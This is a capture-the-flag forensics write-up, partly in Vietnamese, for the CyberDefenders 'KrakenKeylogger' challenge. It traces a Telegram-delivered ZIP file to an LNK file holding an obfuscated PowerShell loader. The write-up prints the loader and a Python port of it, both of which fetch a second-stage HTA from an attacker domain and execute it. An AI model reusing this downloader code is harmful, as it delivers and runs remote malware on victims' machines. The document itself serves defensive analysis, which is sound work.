## Description 
> an employee interacts with a threat actor through a messaging app, notifications become key to unraveling cyber attacks
## Link challenge 
> https://cyberdefenders.org/blueteam-ctf-challenges/krakenkeylogger/learn
## Solution

- Thứ nhất đề có đề cập đến việc thông báo chính là chìa khoá của cả bài.
- Lục tìm tại `C:\Users\$username\AppData\Local\Microsoft\Windows\Notifications\wpndatabase.db` để tìm lại lịch sử thông báo. 
- Thấy có 1 tag thông báo có nội dung 
```
<toast launch="0|0|Default|0|https://web.telegram.org/|p#https://web.telegram.org/#" displayTimestamp="2023-07-11T16:57:15Z">
 <visual>
  <binding template="ToastGeneric">
   <text>Nawaf</text>
   <text>📎 our project templet test.zip,pass:@1122d</text>
   <text placement="attribution">web.telegram.org</text>
   <image placement="appLogoOverride" src="C:\Users\OMEN\AppData\Local\Google\Chrome\User Data\Notification Resources\cd18935b-57e3-4838-b5e3-ef360362f771.tmp" hint-crop="none"/>
  </binding>
 </visual>
 <actions>
  <action content="Go to Chrome notification settings" placement="contextMenu" activationType="foreground" arguments="2|0|Default|0|https://web.telegram.org/|p#https://web.telegram.org/#"/>
 </actions>
</toast>
```
- Thấy rằng thông báo đến từ trang web `telegram` và đính kèm liên kết `test.zip` có password là `@1122d`
> Q1 : What is the the web messaging app the employee used to talk to the attacker?
> telegram

> Q2 : What is the password for the protected ZIP file sent by the attacker to the employee?
> @1122d

- Em tìm file `test.zip` để bắt đầu phân tích bằng lệnh `find -D tree | grep test.zip`, ở đây em thu được địa chỉ nằm tại `./Users/OMEN/Downloads/project templet test.zip`
- Giải nén ra bằng mật khẩu em có được 2 file 1 file docx và 1 file lnk
- Phân tích file lnk, thấy rằng nó bao gồm 1 đoạn powershell đáng ngờ
```
$ProgressPreference = 0;
function nvRClWiAJT($OnUPXhNfGyEh){$OnUPXhNfGyEh[$OnUPXhNfGyEh.Length..0] -join('')};
function sDjLksFILdkrdR($OnUPXhNfGyEh){
$vecsWHuXBHu = nvRClWiAJT $OnUPXhNfGyEh;
for($TJuYrHOorcZu = 0;$TJuYrHOorcZu -lt $vecsWHuXBHu.Length;$TJuYrHOorcZu += 2){
try{$zRavFAQNJqOVxb += nvRClWiAJT $vecsWHuXBHu.Substring($TJuYrHOorcZu,2)}
catch{$zRavFAQNJqOVxb += $vecsWHuXBHu.Substring($TJuYrHOorcZu,1)}};$zRavFAQNJqOVxb};
$NpzibtULgyi = sDjLksFILdkrdR 'aht1.sen/hi/coucys.erstmaofershma//s:tpht';
$cDkdhkGBtl = $env:APPDATA + '\' + ($NpzibtULgyi -split '/')[-1];
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
$wbpiCTsGYi = wget $NpzibtULgyi -UseBasicParsing;
[IO.File]::WriteAllText($cDkdhkGBtl, $wbpiCTsGYi);
& $cDkdhkGBtl;
sleep 3;
rm $cDkdhkGBtl;
```
- Để dễ hiểu hơn em dùng chat gpt convert nó qua python 
```
import os
import requests
import time
import ssl

def nvRClWiAJT(OnUPXhNfGyEh):
    return ''.join(reversed(OnUPXhNfGyEh))

def sDjLksFILdkrdR(OnUPXhNfGyEh):
    vecsWHuXBHu = nvRClWiAJT(OnUPXhNfGyEh)
    zRavFAQNJqOVxb = ''
    for TJuYrHOorcZu in range(0, len(vecsWHuXBHu), 2):
        try:
            zRavFAQNJqOVxb += nvRClWiAJT(vecsWHuXBHu[TJuYrHOorcZu:TJuYrHOorcZu + 2])
        except:
            zRavFAQNJqOVxb += vecsWHuXBHu[TJuYrHOorcZu:TJuYrHOorcZu + 1]
    return zRavFAQNJqOVxb

NpzibtULgyi = sDjLksFILdkrdR('aht1.sen/hi/coucys.erstmaofershma//s:tpht')
cDkdhkGBtl = os.path.join(os.getenv('APPDATA'), NpzibtULgyi.split('/')[-1])

ssl_context = ssl.create_default_context()
ssl_context.set_ciphers('DEFAULT@SECLEVEL=1')
response = requests.get(NpzibtULgyi, verify=False)
wbpiCTsGYi = response.text

with open(cDkdhkGBtl, 'w') as f:
    f.write(wbpiCTsGYi)

os.system(cDkdhkGBtl)
time.sleep(3)
os.remove(cDkdhkGBtl)

```
- Ở đây xử lý đường link `aht1.sen/hi/coucys.erstmaofershma//s:tpht` và lưu dữ liệu vào file cDkdhkGBtl
- Em sửa cript để nó in ra đường dẫn chính xác 
```
import os
import time
import ssl

def nvRClWiAJT(OnUPXhNfGyEh):
    return ''.join(reversed(OnUPXhNfGyEh))

def sDjLksFILdkrdR(OnUPXhNfGyEh):
    vecsWHuXBHu = nvRClWiAJT(OnUPXhNfGyEh)
    zRavFAQNJqOVxb = ''
    for TJuYrHOorcZu in range(0, len(vecsWHuXBHu), 2):
        try:
            zRavFAQNJqOVxb += nvRClWiAJT(vecsWHuXBHu[TJuYrHOorcZu:TJuYrHOorcZu + 2])
        except:
            zRavFAQNJqOVxb += vecsWHuXBHu[TJuYrHOorcZu:TJuYrHOorcZu + 1]
    return zRavFAQNJqOVxb

NpzibtULgyi = sDjLksFILdkrdR('aht1.sen/hi/coucys.erstmaofershma//s:tpht')

print(NpzibtULgyi)
```
- Kết quả : https://masherofmasters.cyou/chin/se1.hta
> Q : What domain did the attacker use to download the second stage of the malware?

> A : masherofmasters.cyou